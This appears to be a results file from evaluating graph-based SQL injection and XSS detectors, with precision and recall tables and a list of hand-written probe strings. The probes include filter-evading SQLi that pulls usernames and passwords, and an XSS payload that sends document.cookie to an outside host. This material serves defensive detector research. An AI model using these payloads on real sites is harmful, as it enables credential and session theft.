@@ -1,0 +1,145 @@
+=== A. E_sem presence vs label (fraction of graphs with >=1 E_sem edge) ===
+                set              class/cell     n frac_with_E_sem
+train+test (43,659)                  Benign 15000          0.0000
+train+test (43,659)                    SQLi 18595          0.2953
+train+test (43,659)                     XSS 10064          0.0274
+  external (30,677)                  Benign 19293          0.0000
+  external (30,677)                    SQLi 10852          0.4905
+  external (30,677)                     XSS   532          0.0564
+    held-out matrix      Benign/field_query    10          0.0000
+    held-out matrix     Benign/header_field    10          0.0000
+    held-out matrix       Benign/json_field    10          0.0000
+    held-out matrix   SQLi/sql_new_commands    10          0.0000
+    held-out matrix  SQLi/comment_splitting    10          1.0000
+    held-out matrix        SQLi/case_mixing    10          1.0000
+    held-out matrix     XSS/data_uri_base64    10          0.0000
+    held-out matrix XSS/event_handler_focus    10          0.0000
+    held-out matrix  XSS/svg_script_variant    10          0.0000
+  rule 'has E_sem => attack' on train+test: precision=1.0000  recall=0.2013
+  rule 'has E_sem => attack' on external: precision=1.0000  recall=0.4702
+
+=== B. Distinct inputs in the 90-row held-out matrix (digits masked) ===
+  distinct masked templates per cell: {('Benign', 'field_query'): 1, ('Benign', 'header_field'): 1, ('Benign', 'json_field'): 1, ('SQLi', 'sql_new_commands'): 1, ('SQLi', 'comment_splitting'): 1, ('SQLi', 'case_mixing'): 1, ('XSS', 'data_uri_base64'): 10, ('XSS', 'event_handler_focus'): 1, ('XSS', 'svg_script_variant'): 10}
+  total distinct = 27 of 90 rows
+  node counts per cell (min,max): Benign/field_query=16-16; Benign/header_field=12-12; Benign/json_field=27-27; SQLi/sql_new_commands=10-10; SQLi/comment_splitting=37-37; SQLi/case_mixing=32-32; XSS/data_uri_base64=10-10; XSS/event_handler_focus=31-31; XSS/svg_script_variant=29-29
+
+=== Graph-size regime (fraction of graphs per node-count bucket) ===
+     train Benign train SQLi train XSS external Benign external SQLi external XSS matrix Benign
+1           0.000      0.000     0.000           0.683         0.000        0.000         0.000
+2           0.000      0.000     0.000           0.070         0.000        0.000         0.000
+3           0.004      0.000     0.001           0.047         0.000        0.000         0.000
+4-6         0.013      0.114     0.002           0.119         0.004        0.017         0.000
+7-12        0.104      0.526     0.011           0.081         0.103        0.073         0.333
+13+         0.879      0.359     0.985           0.001         0.893        0.910         0.667
+
+=== C. Fresh probes outside the 9 held-out templates (hand-written; 6 strings per group, per seed) ===
+E_sem edges the builder produced per string (0 == builder blind):
+  sqli_split_builder_sees      [4, 4, 4, 4, 4, 6]
+  sqli_obfusc_builder_blind    [0, 4, 4, 0, 4, 0]
+  benign_with_sem_pairs        [6, 2, 2, 2, 6, 2]
+  benign_short                 [0, 0, 0, 0, 0, 0]
+  xss_new                      [2, 0, 0, 0, 0, 0]
+correct / (6 strings x seeds):
+        model  seeds sqli_split_builder_sees sqli_obfusc_builder_blind benign_with_sem_pairs benign_short xss_new
+          hgt      5                   25/30                     15/30                  5/30        12/30   30/30
+hgt_collapsed      5                    8/30                     11/30                 15/30        16/30   30/30
+   hgt_random      5                    7/30                      9/30                 15/30        16/30   30/30
+        gatv2      5                    7/30                      9/30                 15/30        16/30   30/30
+per-string, HGT typed (predictions over 5 seeds; B=Benign S=SQLi X=XSS):
+  [S] hgt=SSSSB gatv2=BBBBB sem=4 n=27  id=1 UN/**/ION SE/**/LECT username,password FR/**/OM accounts--
+  [S] hgt=SSSSS gatv2=BBBBS sem=4 n=29  q=5' UNI/**/ON SEL/**/ECT NULL,NULL FR/**/OM dual-- -
+  [S] hgt=SSSSS gatv2=SSSSS sem=4 n=30  uid=7 UNION/**/SELECT 1,2,3 FR/**/OM users WH/**/ERE 1=1
+  [S] hgt=BSSSB gatv2=BBBBB sem=4 n=31  cat=3 UN/**/ION AL/**/L SE/**/LECT name FR/**/OM items--
+  [S] hgt=SSSSS gatv2=BBBBS sem=4 n=34  x=9;UNI/**/ON SEL/**/ECT pass FR/**/OM admin LIM/**/IT 1;--
+  [S] hgt=BSSSB gatv2=BBBBB sem=6 n=38  page=2 UN/**/ION SE/**/LECT * FR/**/OM orders OR/**/DER B/**/Y 1--
+  [S] hgt=BBBBB gatv2=BBBBB sem=0 n=18  id=1 UNI+ON SEL+ECT username,password FR+OM accounts--
+  [S] hgt=SSSSS gatv2=SBBSS sem=4 n=17  q=5' UN%0aION SE%0aLECT NULL,NULL FR%0aOM dual-- -
+  [S] hgt=SSSSS gatv2=SSSSS sem=4 n=16  uid=7 UNION SELECT 1,2,3 FROM users WHERE 1=1
+  [S] hgt=BBBBB gatv2=BBBBB sem=0 n=28  cat=3 U/*x*/NION SEL/*y*/ECT name FR/*z*/OM items--
+  [S] hgt=SSSSS gatv2=BBBBS sem=4 n=27  x=9;UNI%2f%2a%2a%2fON SEL%2f%2a%2a%2fECT pass FR%2f%2a%2a%2fOM admin;-
+  [S] hgt=BBBBB gatv2=BBBBB sem=0 n=16  page=2 uni!on sel!ect * fr!om orders--
+  [B] hgt=SSSSS gatv2=BBBBB sem=6 n=12  Please order by date and group by category in the monthly report
+  [B] hgt=SSSSS gatv2=SSSSS sem=2 n= 8  select the best option from the list below
+  [B] hgt=BBBBB gatv2=BBBBB sem=2 n=20  GET /search?q=order+by+price&sort=asc HTTP/1.1
+  [B] hgt=SSSSS gatv2=SSSSS sem=2 n= 7  the union select committee meets on friday
+  [B] hgt=SSSSS gatv2=BBBBB sem=6 n= 7  group by region then order by revenue
+  [B] hgt=SSSSS gatv2=SSSSS sem=2 n= 8  select name from the dropdown and press save
+  [B] hgt=SSSBS gatv2=SSSSS sem=0 n= 3  12 Baker Street
+  [B] hgt=SSSSS gatv2=SSSSS sem=0 n= 1  42
+  [B] hgt=XXXXX gatv2=BXXBX sem=0 n= 7  john.smith@example.com
+  [B] hgt=BBBBB gatv2=BBBBS sem=0 n= 7  page=3&sort=asc
+  [B] hgt=BSBBB gatv2=BBBBB sem=0 n= 4  Hanoi, Vietnam 100000
+  [B] hgt=BBXXX gatv2=BBBBB sem=0 n= 1  user_1187
+  [X] hgt=XXXXX gatv2=XXXXX sem=2 n=14  <img src=x onerror=alert(document.domain)>
+  [X] hgt=XXXXX gatv2=XXXXX sem=0 n=20  <body onpageshow=fetch('//e.io/'+document.cookie)>
+  [X] hgt=XXXXX gatv2=XXXXX sem=0 n=24  <iframe srcdoc='<script>parent.x(1)</script>'></iframe>
+  [X] hgt=XXXXX gatv2=XXXXX sem=0 n=10  <details open ontoggle=confirm(1)>
+  [X] hgt=XXXXX gatv2=XXXXX sem=0 n=23  <a href="jav&#x61;script:alert(1)">go</a>
+  [X] hgt=XXXXX gatv2=XXXXX sem=0 n=10  <input autofocus onfocus=prompt(1)>
+
+=== D. External dataset: Benign false-positive structure (n_benign, has E_sem vs not; size buckets) ===
+external Benign n=19293; with E_sem: 0 (0.0000)
+        model  seed  benign_recall  ben_recall_noSem  ben_recall_withSem  frac_FP_that_have_sem  sqli_recall  xss_recall  benign_recall_dropSem  sqli_recall_dropSem  xss_recall_dropSem
+          hgt    42          0.571             0.571                 NaN                    0.0        0.875       0.983                  0.571                0.845               0.983
+          hgt    43          0.726             0.726                 NaN                    0.0        0.923       0.987                  0.726                0.916               0.987
+          hgt    44          0.059             0.059                 NaN                    0.0        0.962       0.985                  0.059                0.951               0.985
+          hgt    45          0.083             0.083                 NaN                    0.0        0.914       0.985                  0.083                0.887               0.985
+          hgt    46          0.111             0.111                 NaN                    0.0        0.866       0.985                  0.111                0.822               0.985
+hgt_collapsed    42          0.682             0.682                 NaN                    0.0        0.947       0.981                    NaN                  NaN                 NaN
+hgt_collapsed    43          0.650             0.650                 NaN                    0.0        0.892       0.985                    NaN                  NaN                 NaN
+hgt_collapsed    44          0.686             0.686                 NaN                    0.0        0.888       0.985                    NaN                  NaN                 NaN
+hgt_collapsed    45          0.552             0.552                 NaN                    0.0        0.949       0.981                    NaN                  NaN                 NaN
+hgt_collapsed    46          0.593             0.593                 NaN                    0.0        0.899       0.985                    NaN                  NaN                 NaN
+   hgt_random    42          0.586             0.586                 NaN                    0.0        0.945       0.981                    NaN                  NaN                 NaN
+   hgt_random    43          0.544             0.544                 NaN                    0.0        0.888       0.991                    NaN                  NaN                 NaN
+   hgt_random    44          0.723             0.723                 NaN                    0.0        0.888       0.992                    NaN                  NaN                 NaN
+   hgt_random    45          0.573             0.573                 NaN                    0.0        0.973       0.994                    NaN                  NaN                 NaN
+   hgt_random    46          0.609             0.609                 NaN                    0.0        0.877       0.987                    NaN                  NaN                 NaN
+        gatv2    42          0.695             0.695                 NaN                    0.0        0.928       0.991                    NaN                  NaN                 NaN
+        gatv2    43          0.636             0.636                 NaN                    0.0        0.969       0.989                    NaN                  NaN                 NaN
+        gatv2    44          0.688             0.688                 NaN                    0.0        0.910       0.987                    NaN                  NaN                 NaN
+        gatv2    45          0.719             0.719                 NaN                    0.0        0.965       0.985                    NaN                  NaN                 NaN
+        gatv2    46          0.633             0.633                 NaN                    0.0        0.967       0.991                    NaN                  NaN                 NaN
+Benign recall by graph size (number of tokens):
+        model  seed  ben_rec_n1  ben_rec_n2  ben_rec_n3  ben_rec_n4-6  ben_rec_n7-12  ben_rec_n13+
+          hgt    42       0.565       0.958       0.821         0.266          0.587         0.769
+          hgt    43       0.838       0.958       0.856         0.215          0.251         0.692
+          hgt    44       0.000       0.000       0.793         0.038          0.206         0.692
+          hgt    45       0.000       0.002       0.911         0.081          0.371         0.769
+          hgt    46       0.000       0.004       0.846         0.188          0.597         0.846
+hgt_collapsed    42       0.674       0.971       0.814         0.441          0.769         0.923
+hgt_collapsed    43       0.674       0.985       0.817         0.297          0.576         1.000
+hgt_collapsed    44       0.683       0.989       0.934         0.428          0.681         0.692
+hgt_collapsed    45       0.535       0.972       0.816         0.264          0.604         0.769
+hgt_collapsed    46       0.597       0.972       0.812         0.288          0.547         0.769
+   hgt_random    42       0.512       0.963       0.808         0.644          0.670         0.923
+   hgt_random    43       0.539       0.965       0.798         0.289          0.445         0.846
+   hgt_random    44       0.673       0.979       0.880         0.765          0.776         1.000
+   hgt_random    45       0.567       0.962       0.814         0.386          0.419         0.769
+   hgt_random    46       0.539       0.945       0.856         0.602          0.776         1.000
+        gatv2    42       0.637       0.972       0.808         0.812          0.712         0.923
+        gatv2    43       0.641       0.963       0.808         0.360          0.608         0.846
+        gatv2    44       0.691       0.974       0.822         0.430          0.719         1.000
+        gatv2    45       0.651       0.972       0.818         0.863          0.808         1.000
+        gatv2    46       0.655       0.966       0.803         0.302          0.546         0.846
+Benign false positives predicted as:
+  hgt            seed 42: {'SQLi': 4999, 'XSS': 3274}
+  hgt            seed 43: {'SQLi': 3343, 'XSS': 1950}
+  hgt            seed 44: {'SQLi': 7462, 'XSS': 10699}
+  hgt            seed 45: {'XSS': 16043, 'SQLi': 1652}
+  hgt            seed 46: {'SQLi': 3391, 'XSS': 13764}
+  hgt_collapsed  seed 42: {'SQLi': 5602, 'XSS': 539}
+  hgt_collapsed  seed 43: {'SQLi': 5068, 'XSS': 1680}
+  hgt_collapsed  seed 44: {'SQLi': 4433, 'XSS': 1625}
+  hgt_collapsed  seed 45: {'SQLi': 7042, 'XSS': 1596}
+  hgt_collapsed  seed 46: {'SQLi': 5419, 'XSS': 2441}
+  hgt_random     seed 42: {'SQLi': 7295, 'XSS': 690}
+  hgt_random     seed 43: {'SQLi': 7081, 'XSS': 1720}
+  hgt_random     seed 44: {'SQLi': 4691, 'XSS': 644}
+  hgt_random     seed 45: {'SQLi': 6001, 'XSS': 2239}
+  hgt_random     seed 46: {'SQLi': 5408, 'XSS': 2132}
+  gatv2          seed 42: {'XSS': 4750, 'SQLi': 1127}
+  gatv2          seed 43: {'SQLi': 5213, 'XSS': 1813}
+  gatv2          seed 44: {'SQLi': 4555, 'XSS': 1458}
+  gatv2          seed 45: {'SQLi': 5205, 'XSS': 211}
+  gatv2          seed 46: {'SQLi': 5283, 'XSS': 1790}
